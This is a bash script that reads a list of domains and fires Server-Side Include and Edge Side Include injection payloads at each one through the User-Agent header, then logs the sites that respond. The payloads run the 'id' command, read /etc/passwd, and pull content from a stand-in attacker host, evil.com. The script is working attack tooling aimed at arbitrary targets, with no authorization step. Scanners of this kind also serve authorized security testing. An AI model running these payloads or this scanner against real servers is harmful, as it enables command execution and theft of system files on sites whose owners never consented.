#!/bin/bash

echo "Running SSI/ESI checks..."

# Get the directory where the script is located
SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"

# Import configuration
source "${SCRIPT_DIR}/utils.conf"

setup() {
    # Create SSI_ESI_DIR if it doesn't exist
    mkdir -p "${LOG_DIR}/${SSI_ESI_DIR}"
    
    OUTPUT_FILE="${LOG_DIR}/${SSI_ESI_DIR}/${SSI_ESI_FILE}"
    
    # Ensure output file exists and is writable
    touch "$OUTPUT_FILE"
    chmod 644 "$OUTPUT_FILE"
}

check_ssi_vulnerability() {
    local domain="$1"
    local output_file="$2"
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    
    # Test for SSI vulnerability using common SSI directives
    local ssi_payloads=(
        "<!--#exec cmd=\"id\" -->"
        "<!--#include virtual=\"/etc/passwd\" -->"
        "<!--#include file=\"/etc/passwd\" -->"
        "<!--#echo var=\"DATE_LOCAL\" -->"
    )
    
    for payload in "${ssi_payloads[@]}"; do
        response=$(curl -s -k -H "User-Agent: ${payload}" "https://${domain}" 2>/dev/null)
        if echo "$response" | grep -q "uid=" || echo "$response" | grep -q "root:"; then
            echo "===================================================" >> "$output_file"
            echo "SSI Vulnerability Found!" >> "$output_file"
            echo "Target: $domain" >> "$output_file"
            echo "Payload: $payload" >> "$output_file"
            echo "Timestamp: $timestamp" >> "$output_file"
            echo "===================================================" >> "$output_file"
            return 0
        fi
    done
    return 1
}

check_esi_vulnerability() {
    local domain="$1"
    local output_file="$2"
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    
    # Test for ESI vulnerability using common ESI directives
    local esi_payloads=(
        "<esi:include src=\"http://evil.com\"/>"
        "<esi:include src=\"file:///etc/passwd\"/>"
        "<esi:vars>$()</esi:vars>"
        "<esi:try><esi:attempt><esi:include src=\"http://evil.com\"/></esi:attempt></esi:try>"
    )
    
    for payload in "${esi_payloads[@]}"; do
        response=$(curl -s -k -H "Surrogate-Control: content=\"ESI/1.0\"" -H "User-Agent: ${payload}" "https://${domain}" 2>/dev/null)
        if echo "$response" | grep -q "evil.com" || echo "$response" | grep -q "root:"; then
            echo "===================================================" >> "$output_file"
            echo "ESI Vulnerability Found!" >> "$output_file"
            echo "Target: $domain" >> "$output_file"
            echo "Payload: $payload" >> "$output_file"
            echo "Timestamp: $timestamp" >> "$output_file"
            echo "===================================================" >> "$output_file"
            return 0
        fi
    done
    return 1
}

run_ssi_esi() {
    local input_file="$1"
    local output_file="$2"

    if [[ ! -f "$input_file" ]]; then
        echo "Error: Input file '$input_file' does not exist"
        exit 1
    fi

    while IFS= read -r domain; do
        [[ -z "$domain" ]] && continue
        echo "Testing $domain for SSI/ESI vulnerabilities..."
        
        # Check for SSI vulnerabilities
        if check_ssi_vulnerability "$domain" "$output_file"; then
            echo "[!] SSI vulnerability found in $domain"
        fi
        
        # Check for ESI vulnerabilities
        if check_esi_vulnerability "$domain" "$output_file"; then
            echo "[!] ESI vulnerability found in $domain"
        fi
        
    done < "$input_file"
}

main() {
    local input_file=""
    local output_file="${LOG_DIR}/${SSI_ESI_DIR}/${SSI_ESI_FILE}"

    while [[ "$#" -gt 0 ]]; do
        case $1 in
            --input)
                input_file="$2"
                shift ;;
            --output)
                output_file="$2"
                shift ;;
            *)
                echo "Unknown parameter: $1"
                exit 1 ;;
        esac
        shift
    done

    if [[ -z "$input_file" ]]; then
        echo "Error: No input file specified"
        echo "Usage: $0 --input <input_file> [--output <output_file>]"
        exit 1
    fi

    setup
    run_ssi_esi "$input_file" "$output_file"
}

main "$@"